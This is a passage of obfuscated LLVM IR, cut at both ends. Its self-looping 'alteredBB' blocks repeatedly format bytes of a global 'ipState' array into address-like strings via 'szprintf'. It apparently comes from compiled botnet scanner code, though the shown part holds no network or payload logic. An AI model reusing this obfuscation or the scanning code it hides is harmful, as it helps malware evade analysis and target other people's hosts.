  %5464 = call i32 (i8*, i8*, ...) @szprintf(i8* %5459, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.691, i32 0, i32 0), i32 %5461, i32 %5463)
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %398
  %5465 = load i32, i32* %1, align 4
  %5466 = icmp eq i32 %5465, 19
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %437
  %5467 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5468 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5469 = zext i8 %5468 to i32
  %5470 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5471 = zext i8 %5470 to i32
  %5472 = call i32 (i8*, i8*, ...) @szprintf(i8* %5467, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.695, i32 0, i32 0), i32 %5469, i32 %5471)
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %473
  %5473 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5474 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5475 = zext i8 %5474 to i32
  %5476 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5477 = zext i8 %5476 to i32
  %5478 = call i32 (i8*, i8*, ...) @szprintf(i8* %5473, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.697, i32 0, i32 0), i32 %5475, i32 %5477)
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %496
  %5479 = load i32, i32* %1, align 4
  %5480 = icmp eq i32 %5479, 24
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %522
  %5481 = load i32, i32* %1, align 4
  %5482 = icmp eq i32 %5481, 25
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %558
  %5483 = load i32, i32* %1, align 4
  %5484 = icmp eq i32 %5483, 27
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %577
  %5485 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5486 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5487 = zext i8 %5486 to i32
  %5488 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5489 = zext i8 %5488 to i32
  %5490 = call i32 (i8*, i8*, ...) @szprintf(i8* %5485, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.700, i32 0, i32 0), i32 %5487, i32 %5489)
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %600
  %5491 = load i32, i32* %1, align 4
  %5492 = icmp eq i32 %5491, 28
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %676
  %5493 = load i32, i32* %1, align 4
  %5494 = icmp eq i32 %5493, 34
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %702
  %5495 = load i32, i32* %1, align 4
  %5496 = icmp eq i32 %5495, 34
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %741
  %5497 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5498 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5499 = zext i8 %5498 to i32
  %5500 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5501 = zext i8 %5500 to i32
  %5502 = call i32 (i8*, i8*, ...) @szprintf(i8* %5497, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.710, i32 0, i32 0), i32 %5499, i32 %5501)
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %784
  %5503 = load i32, i32* %1, align 4
  %5504 = icmp eq i32 %5503, 39
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %823
  %5505 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5506 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5507 = zext i8 %5506 to i32
  %5508 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5509 = zext i8 %5508 to i32
  %5510 = call i32 (i8*, i8*, ...) @szprintf(i8* %5505, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.715, i32 0, i32 0), i32 %5507, i32 %5509)
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %889
  %5511 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5512 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5513 = zext i8 %5512 to i32
  %5514 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5515 = zext i8 %5514 to i32
  %5516 = call i32 (i8*, i8*, ...) @szprintf(i8* %5511, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.720, i32 0, i32 0), i32 %5513, i32 %5515)
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %922
  %5517 = load i32, i32* %1, align 4
  %5518 = icmp eq i32 %5517, 48
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %948
  %5519 = load i32, i32* %1, align 4
  %5520 = icmp eq i32 %5519, 49
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %967
  %5521 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5522 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5523 = zext i8 %5522 to i32
  %5524 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5525 = zext i8 %5524 to i32
  %5526 = call i32 (i8*, i8*, ...) @szprintf(i8* %5521, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.723, i32 0, i32 0), i32 %5523, i32 %5525)
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %1010
  %5527 = load i32, i32* %1, align 4
  %5528 = icmp eq i32 %5527, 52
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %1036
  %5529 = load i32, i32* %1, align 4
  %5530 = icmp eq i32 %5529, 53
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1075
  %5531 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5532 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5533 = zext i8 %5532 to i32
  %5534 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5535 = zext i8 %5534 to i32
  %5536 = call i32 (i8*, i8*, ...) @szprintf(i8* %5531, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.729, i32 0, i32 0), i32 %5533, i32 %5535)
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1138
  %5537 = load i32, i32* %1, align 4
  %5538 = icmp eq i32 %5537, 60
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1167
  %5539 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5540 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5541 = zext i8 %5540 to i32
  %5542 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5543 = zext i8 %5542 to i32
  %5544 = call i32 (i8*, i8*, ...) @szprintf(i8* %5539, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.735, i32 0, i32 0), i32 %5541, i32 %5543)
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1193
  %5545 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5546 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5547 = zext i8 %5546 to i32
  %5548 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5549 = zext i8 %5548 to i32
  %5550 = call i32 (i8*, i8*, ...) @szprintf(i8* %5545, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.736, i32 0, i32 0), i32 %5547, i32 %5549)
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1216
  %5551 = load i32, i32* %1, align 4
  %5552 = icmp eq i32 %5551, 63
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1262
  %5553 = load i32, i32* %1, align 4
  %5554 = icmp eq i32 %5553, 66
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1308
  %5555 = load i32, i32* %1, align 4
  %5556 = icmp eq i32 %5555, 69
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1357
  %5557 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5558 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5559 = zext i8 %5558 to i32
  %5560 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5561 = zext i8 %5560 to i32
  %5562 = call i32 (i8*, i8*, ...) @szprintf(i8* %5557, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.745, i32 0, i32 0), i32 %5559, i32 %5561)
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1383
  %5563 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5564 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5565 = zext i8 %5564 to i32
  %5566 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5567 = zext i8 %5566 to i32
  %5568 = call i32 (i8*, i8*, ...) @szprintf(i8* %5563, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.700, i32 0, i32 0), i32 %5565, i32 %5567)
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1416
  %5569 = load i32, i32* %1, align 4
  %5570 = icmp eq i32 %5569, 75
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1482
  %5571 = load i32, i32* %1, align 4
  %5572 = icmp eq i32 %5571, 80
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1511
  %5573 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5574 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5575 = zext i8 %5574 to i32
  %5576 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5577 = zext i8 %5576 to i32
  %5578 = call i32 (i8*, i8*, ...) @szprintf(i8* %5573, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.752, i32 0, i32 0), i32 %5575, i32 %5577)
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1567
  %5579 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5580 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5581 = zext i8 %5580 to i32
  %5582 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5583 = zext i8 %5582 to i32
  %5584 = call i32 (i8*, i8*, ...) @szprintf(i8* %5579, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.756, i32 0, i32 0), i32 %5581, i32 %5583)
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1590
  %5585 = load i32, i32* %1, align 4
  %5586 = icmp eq i32 %5585, 86
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1616
  %5587 = load i32, i32* %1, align 4
  %5588 = icmp eq i32 %5587, 87
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1652
  %5589 = load i32, i32* %1, align 4
  %5590 = icmp eq i32 %5589, 89
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1678
  %5591 = load i32, i32* %1, align 4
  %5592 = icmp eq i32 %5591, 90
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1697
  %5593 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5594 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5595 = zext i8 %5594 to i32
  %5596 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5597 = zext i8 %5596 to i32
  %5598 = call i32 (i8*, i8*, ...) @szprintf(i8* %5593, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.761, i32 0, i32 0), i32 %5595, i32 %5597)
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1723
  %5599 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5600 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5601 = zext i8 %5600 to i32
  %5602 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5603 = zext i8 %5602 to i32
  %5604 = call i32 (i8*, i8*, ...) @szprintf(i8* %5599, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.762, i32 0, i32 0), i32 %5601, i32 %5603)
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1759
  %5605 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5606 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5607 = zext i8 %5606 to i32
  %5608 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5609 = zext i8 %5608 to i32
  %5610 = call i32 (i8*, i8*, ...) @szprintf(i8* %5605, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.752, i32 0, i32 0), i32 %5607, i32 %5609)
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1785
  %5611 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5612 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5613 = zext i8 %5612 to i32
  %5614 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5615 = zext i8 %5614 to i32
  %5616 = call i32 (i8*, i8*, ...) @szprintf(i8* %5611, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.764, i32 0, i32 0), i32 %5613, i32 %5615)
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1821
  %5617 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5618 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5619 = zext i8 %5618 to i32
  %5620 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5621 = zext i8 %5620 to i32
  %5622 = call i32 (i8*, i8*, ...) @szprintf(i8* %5617, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.766, i32 0, i32 0), i32 %5619, i32 %5621)
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1847
  %5623 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5624 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5625 = zext i8 %5624 to i32
  %5626 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5627 = zext i8 %5626 to i32
  %5628 = call i32 (i8*, i8*, ...) @szprintf(i8* %5623, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.765, i32 0, i32 0), i32 %5625, i32 %5627)
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1870
  %5629 = load i32, i32* %1, align 4
  %5630 = icmp eq i32 %5629, 98
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1899
  %5631 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5632 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5633 = zext i8 %5632 to i32
  %5634 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5635 = zext i8 %5634 to i32
  %5636 = call i32 (i8*, i8*, ...) @szprintf(i8* %5631, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.768, i32 0, i32 0), i32 %5633, i32 %5635)
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1922
  %5637 = load i32, i32* %1, align 4
  %5638 = icmp eq i32 %5637, 100
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1978
  %5639 = load i32, i32* %1, align 4
  %5640 = icmp eq i32 %5639, 104
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %2004
  %5641 = load i32, i32* %1, align 4
  %5642 = icmp eq i32 %5641, 105
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %2043
  %5643 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5644 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5645 = zext i8 %5644 to i32
  %5646 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5647 = zext i8 %5646 to i32
  %5648 = call i32 (i8*, i8*, ...) @szprintf(i8* %5643, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.776, i32 0, i32 0), i32 %5645, i32 %5647)
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %2066
  %5649 = load i32, i32* %1, align 4
  %5650 = icmp eq i32 %5649, 108
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %2092
  %5651 = load i32, i32* %1, align 4
  %5652 = icmp eq i32 %5651, 109
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %2118
  %5653 = load i32, i32* %1, align 4
  %5654 = icmp eq i32 %5653, 110
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %2147
  %5655 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5656 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5657 = zext i8 %5656 to i32
  %5658 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5659 = zext i8 %5658 to i32
  %5660 = call i32 (i8*, i8*, ...) @szprintf(i8* %5655, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.765, i32 0, i32 0), i32 %5657, i32 %5659)
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %2173
  %5661 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5662 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5663 = zext i8 %5662 to i32
  %5664 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5665 = zext i8 %5664 to i32
  %5666 = call i32 (i8*, i8*, ...) @szprintf(i8* %5661, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.780, i32 0, i32 0), i32 %5663, i32 %5665)
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %2206
  %5667 = load i32, i32* %1, align 4
  %5668 = icmp eq i32 %5667, 114
  br label %originalBB258

originalBB262alteredBB:                           ; preds = %originalBB262, %2225
  %5669 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5670 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5671 = zext i8 %5670 to i32
  %5672 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5673 = zext i8 %5672 to i32
  %5674 = call i32 (i8*, i8*, ...) @szprintf(i8* %5669, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.782, i32 0, i32 0), i32 %5671, i32 %5673)
  br label %originalBB262

originalBB266alteredBB:                           ; preds = %originalBB266, %2251
  %5675 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5676 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5677 = zext i8 %5676 to i32
  %5678 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5679 = zext i8 %5678 to i32
  %5680 = call i32 (i8*, i8*, ...) @szprintf(i8* %5675, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.783, i32 0, i32 0), i32 %5677, i32 %5679)
  br label %originalBB266

originalBB270alteredBB:                           ; preds = %originalBB270, %2314
  %5681 = load i32, i32* %1, align 4
  %5682 = icmp eq i32 %5681, 120
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %2333
  %5683 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5684 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5685 = zext i8 %5684 to i32
  %5686 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5687 = zext i8 %5686 to i32
  %5688 = call i32 (i8*, i8*, ...) @szprintf(i8* %5683, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.788, i32 0, i32 0), i32 %5685, i32 %5687)
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %2356
  %5689 = load i32, i32* %1, align 4
  %5690 = icmp eq i32 %5689, 121
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %2395
  %5691 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5692 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5693 = zext i8 %5692 to i32
  %5694 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5695 = zext i8 %5694 to i32
  %5696 = call i32 (i8*, i8*, ...) @szprintf(i8* %5691, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.791, i32 0, i32 0), i32 %5693, i32 %5695)
  br label %originalBB282

originalBB286alteredBB:                           ; preds = %originalBB286, %2428
  %5697 = load i32, i32* %1, align 4
  %5698 = icmp eq i32 %5697, 125
  br label %originalBB286

originalBB290alteredBB:                           ; preds = %originalBB290, %2447
  %5699 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5700 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5701 = zext i8 %5700 to i32
  %5702 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5703 = zext i8 %5702 to i32
  %5704 = call i32 (i8*, i8*, ...) @szprintf(i8* %5699, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.793, i32 0, i32 0), i32 %5701, i32 %5703)
  br label %originalBB290

originalBB294alteredBB:                           ; preds = %originalBB294, %2470
  %5705 = load i32, i32* %1, align 4
  %5706 = icmp eq i32 %5705, 126
  br label %originalBB294

originalBB298alteredBB:                           ; preds = %originalBB298, %2496
  %5707 = load i32, i32* %1, align 4
  %5708 = icmp eq i32 %5707, 127
  br label %originalBB298

originalBB302alteredBB:                           ; preds = %originalBB302, %2522
  %5709 = load i32, i32* %1, align 4
  %5710 = icmp eq i32 %5709, 128
  br label %originalBB302

originalBB306alteredBB:                           ; preds = %originalBB306, %2541
  %5711 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5712 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5713 = zext i8 %5712 to i32
  %5714 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5715 = zext i8 %5714 to i32
  %5716 = call i32 (i8*, i8*, ...) @szprintf(i8* %5711, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.795, i32 0, i32 0), i32 %5713, i32 %5715)
  br label %originalBB306

originalBB310alteredBB:                           ; preds = %originalBB310, %2577
  %5717 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5718 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5719 = zext i8 %5718 to i32
  %5720 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5721 = zext i8 %5720 to i32
  %5722 = call i32 (i8*, i8*, ...) @szprintf(i8* %5717, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.790, i32 0, i32 0), i32 %5719, i32 %5721)
  br label %originalBB310

originalBB314alteredBB:                           ; preds = %originalBB314, %2660
  %5723 = load i32, i32* %1, align 4
  %5724 = icmp eq i32 %5723, 137
  br label %originalBB314

originalBB318alteredBB:                           ; preds = %originalBB318, %2679
  %5725 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5726 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5727 = zext i8 %5726 to i32
  %5728 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5729 = zext i8 %5728 to i32
  %5730 = call i32 (i8*, i8*, ...) @szprintf(i8* %5725, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.803, i32 0, i32 0), i32 %5727, i32 %5729)
  br label %originalBB318

originalBB322alteredBB:                           ; preds = %originalBB322, %2705
  %5731 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5732 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5733 = zext i8 %5732 to i32
  %5734 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5735 = zext i8 %5734 to i32
  %5736 = call i32 (i8*, i8*, ...) @szprintf(i8* %5731, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.804, i32 0, i32 0), i32 %5733, i32 %5735)
  br label %originalBB322

originalBB326alteredBB:                           ; preds = %originalBB326, %2738
  %5737 = load i32, i32* %1, align 4
  %5738 = icmp eq i32 %5737, 140
  br label %originalBB326

originalBB330alteredBB:                           ; preds = %originalBB330, %2764
  %5739 = load i32, i32* %1, align 4
  %5740 = icmp eq i32 %5739, 141
  br label %originalBB330

originalBB334alteredBB:                           ; preds = %originalBB334, %2813
  %5741 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5742 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5743 = zext i8 %5742 to i32
  %5744 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5745 = zext i8 %5744 to i32
  %5746 = call i32 (i8*, i8*, ...) @szprintf(i8* %5741, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.810, i32 0, i32 0), i32 %5743, i32 %5745)
  br label %originalBB334

originalBB338alteredBB:                           ; preds = %originalBB338, %2839
  %5747 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5748 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5749 = zext i8 %5748 to i32
  %5750 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5751 = zext i8 %5750 to i32
  %5752 = call i32 (i8*, i8*, ...) @szprintf(i8* %5747, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.811, i32 0, i32 0), i32 %5749, i32 %5751)
  br label %originalBB338

originalBB342alteredBB:                           ; preds = %originalBB342, %2862
  %5753 = load i32, i32* %1, align 4
  %5754 = icmp eq i32 %5753, 146
  br label %originalBB342

originalBB346alteredBB:                           ; preds = %originalBB346, %2881
  %5755 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5756 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5757 = zext i8 %5756 to i32
  %5758 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5759 = zext i8 %5758 to i32
